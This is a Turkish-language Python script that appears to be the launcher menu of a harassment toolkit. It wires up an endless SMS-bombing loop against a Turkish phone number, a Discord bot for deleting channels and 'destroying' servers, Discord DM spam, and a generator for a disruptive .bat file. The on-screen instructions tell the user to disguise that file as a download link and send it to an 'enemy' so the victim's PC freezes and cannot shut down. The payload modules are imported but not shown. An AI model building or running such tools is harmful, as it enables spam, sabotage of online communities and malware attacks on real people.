from random import choice
from string import ascii_lowercase
from colorama import Fore, Style, Back
from time import sleep
from os import system
from concurrent.futures import ThreadPoolExecutor, wait  
import subprocess

# API fonksiyonlarını içe aktar
# discord
from DİSCORD.server import start_bot  # discord_bot.py dosyasını içe aktar
from DİSCORD.kdm import dchesap_start  # dcbotdm.py dosyasını içe aktar
# telefon numarası spam apisi
from TELEFON.api import A  # bilgisayar virüs dosyası
from VİRÜS.bat import create_file

# API fonksiyonlarını bir listeye ekle
servisler_api = [getattr(A, attribute) for attribute in dir(A)
                   if callable(getattr(A, attribute)) and not attribute.startswith('__')]


def menu_goster():
    system("cls||clear")
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("ŞART YOK://CLASS") + Style.RESET_ALL + f"SMS=APİ: {len(servisler_api)}")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "  1 - TEL" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "  2 - APİ" + Style.RESET_ALL)
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "  3 - SUNUCU PATLATMA BOTU (AÇIKLAMA İÇİN 4)" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "  5 - KENDİ DİSCORD BOT DM SPAM(AÇIKLAMA 6)" + Style.RESET_ALL)  # Yeni seçenek eklendi
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "  7 - ŞUAN YOK" + Style.RESET_ALL)  # Yeni seçenek eklendi
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "  8 - PC VİRUS (AÇIKLAMA 9)" + Style.RESET_ALL)  # Yeni seçenek eklendi
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "  10 - SİSTEM KONTROL" + Style.RESET_ALL)  # Yeni seçenek eklendi
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "  0 - SOSYAL MEDYA HESAP" + Style.RESET_ALL)  # Yeni seçenek eklendi


def giris_al():
    while True:
        try:
            menu = int(input(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Seçenek: " + Style.RESET_ALL))  # Yeni seçenek eklendi
            if 0 <= menu <= 10:  # Yeni seçenek eklendi
                return menu
            else:
                print(Fore.LIGHTRED_EX + "Geçersiz seçenek! Lütfen 0 ile 10 arasında bir sayı girin." +
                      Style.RESET_ALL)  # Yeni seçenek eklendi
                sleep(1)
        except ValueError:
            print(Fore.LIGHTRED_EX + "Lütfen bir sayı girin." + Style.RESET_ALL)
            sleep(1)


def telefon_numarasi_al():
    """Kullanıcıdan geçerli bir telefon numarası alır."""
    while True:
        system("cls||clear")
        print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("TÜRK NUMARA İÇİN SMS") + Style.RESET_ALL +
              f"     APİ: {len(servisler_api)}")
        print(Fore.LIGHTYELLOW_EX + "TELEFON NO +90:" + Fore.LIGHTGREEN_EX, end="")
        tel_no = input().strip()

        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
            return tel_no
        except ValueError:
            print(Fore.LIGHTRED_EX + "Lütfen geçerli bir 10 haneli telefon numarası girin." + Style.RESET_ALL)
            sleep(2)


def api_ile_sms_gonder(tel_no):
    """API'yi kullanarak SMS gönderir."""
    send_a = A(tel_no)

    try:
        with ThreadPoolExecutor() as executor:
            futures = []
            while True:
                for api_func in servisler_api:
                    futures.append(executor.submit(api_func, send_a))
                wait(futures)
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"Hata: {e}" + Style.RESET_ALL)


def sms_gonderme():
    """Kullanıcıdan telefon numarası alır ve SMS gönderir."""
    tel_no = telefon_numarasi_al()
    api_ile_sms_gonder(tel_no)


def api_goster():
    system("cls||clear")
    print(Fore.LIGHTRED_EX + Back.LIGHTYELLOW_EX + "BU İŞİN KİTABINI YAZDIK !" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("TÜRK APİ +90") + Style.RESET_ALL +
          f"     APİ SAYISI 2: {len(servisler_api)}")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------------------------------------------------------------" +
          Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "APİLER:" + Style.RESET_ALL)
    for i, api_func in enumerate(servisler_api):
        print(Fore.LIGHTGREEN_EX + f"  {i+1}. {api_func.__name__}" + Style.RESET_ALL)
    input(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "GERİ DÖN ENTER" + Style.RESET_ALL)


def dchesap_baslat():
    global bot_token, hedef_kullanici_id, mesaj
    dchesap_start(bot_token, hedef_kullanici_id, mesaj)


def info():
    system("cls||clear")
    print(Fore.LIGHTRED_EX + Style.BRIGHT + "İSTEDİNİZ BOTUN TOKEN GİR-VE SUNUCUDA BUNLARI YAZ" + Style.RESET_ALL)
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("!all") + Style.RESET_ALL +
          f"Her Şeyi Kullanıyor (SUNUCU YOK EDİYOR)")
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("!a") + Style.RESET_ALL +
          f"Dmle Kullanım Komutları Atıyor Bunun Gibi")
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("!kspam") + Style.RESET_ALL + f"Kanal Oluştur")
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("!delete") + Style.RESET_ALL + f"Tüm Yazı Kanalı Sil")
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("!spam") + Style.RESET_ALL + f"Bot Ve Webhook Spam Yapıyor")
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("!server") + Style.RESET_ALL + f"Sunucu Adı Ve Foto Değişir")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    input(Fore.LIGHTRED_EX + Style.BRIGHT + "GERİ DÖN ENTER" + Style.RESET_ALL)


def sosyalmedya():
    system("cls||clear")
    print(Fore.LIGHTRED_EX + Style.BRIGHT + "KANKA DİSCORD SUNUCUMA GEL" + Style.RESET_ALL)
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("DİSCORD") + Style.RESET_ALL +
          f"https://discord.gg/6q6kVS6W")
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    input(Fore.LIGHTRED_EX + Style.BRIGHT + "GERİ DÖN ENTER" + Style.RESET_ALL)


def discorddm():
    system("cls||clear")
    print(Fore.LIGHTRED_EX + Style.BRIGHT + "İSTEDİNİZ BOTUN TOKEN GİR (YAVAŞ!)" + Style.RESET_ALL)
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("Aa Bunları Burada Yapacaksın"))
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("1 Bot Tokenı Gir 2 İstediniz Kişinin Discord Id 3 İstediniz Mesaj Gir"))
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    input(Fore.LIGHTRED_EX + Style.BRIGHT + "GERİ DÖN ENTER" + Style.RESET_ALL)

def kontrol():
    system("cls||clear")
    print(Fore.LIGHTRED_EX + Style.BRIGHT + "SÜRÜM GÜNCELLEME 19:40" + Style.RESET_ALL)
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("Sistem Güncel"))
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
    input(Fore.LIGHTRED_EX + Style.BRIGHT + "GERİ DÖN ENTER" + Style.RESET_ALL)

def sorgu_start():
    subprocess.call(["python", "sorgu.py"])  # subprocess.call() kullanımı

while True:
    menu_goster()
    secim = giris_al()
    if secim == 1:
        sms_gonderme()
    elif secim == 2:
        api_goster()
    elif secim == 10:
        kontrol()
    elif secim == 0:
        sosyalmedya()
    elif secim == 6:
        discorddm()
    elif secim == 3:
        token = input(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Discord Bot Token'ını Girin: " + Style.RESET_ALL)
        if token:
            start_bot(token)
        else:
            print(Fore.LIGHTRED_EX + "Lütfen bot token'ı girin!" + Style.RESET_ALL)
    elif secim == 5:
        global bot_token, hedef_kullanici_id, mesaj
        bot_token = input(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Bot Token Girin: " + Style.RESET_ALL)
        if bot_token:
            hedef_kullanici_id = input(
                Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Hedef Kullanıcı ID'sini Girin: " + Style.RESET_ALL)
            if hedef_kullanici_id:
                mesaj = input(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Mesajı Girin: " + Style.RESET_ALL)
                if mesaj:
                    dchesap_baslat()
                else:
                    print(Fore.LIGHTRED_EX + "Lütfen mesaj girin!" + Style.RESET_ALL)
            else:
                print(Fore.LIGHTRED_EX + "Lütfen kullanıcı ID'si girin!" + Style.RESET_ALL)
        else:
            print(Fore.LIGHTRED_EX + "Lütfen bot token'ı girin!" + Style.RESET_ALL)
    elif secim == 4:
        info()
    elif secim == 8:
        file_name = input("Dosya adı (Fark Etmez): ")
        file_path = create_file(file_name)
        print(
            Fore.LIGHTRED_EX + Style.BRIGHT + f"Pc veya Tel Dosya Yolu Bu Dikkatlı Olun Kullanmadan (9) Seçenek Kullanın{file_path}")
        break
    elif secim == 9:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + Style.BRIGHT +
              "BU KOD PC İÇİN SPAM YAPAR (İSİM).BAT DOSYA AÇILDI ZAMAN AŞAĞIDAKİ İŞLEMI YAPIYOR" + Style.RESET_ALL)
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
        print(Fore.LIGHTRED_EX + Style.BRIGHT +
              "İndir zaman size (BAT) dosya yolu vercem siz o dosyayı bulun ve onu bir şekilde indirme linki yapın ve düşmana bunu atın indirdi zaman ona bastı zaman bilgisayar kasmaya başlayacak " +
              Style.RESET_ALL)
        print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("    CMD SPAM     ") + Style.RESET_ALL)
        print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("   HTTPS:// SPAM    ") + Style.RESET_ALL)
        print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format(" PC KAPANMA ENGEL ") + Style.RESET_ALL)
        print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "{:^40}".format("PC KAPANMA SÜRESİ ARTIYOR") + Style.RESET_ALL)
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "------------------------" + Style.RESET_ALL)
        input(Fore.LIGHTRED_EX + Style.BRIGHT + "GERİ DÖN ENTER" + Style.RESET_ALL)
    elif secim == 7:
        sorgu_start()  # Sadece 7. seçenek seçildiğinde çalışacak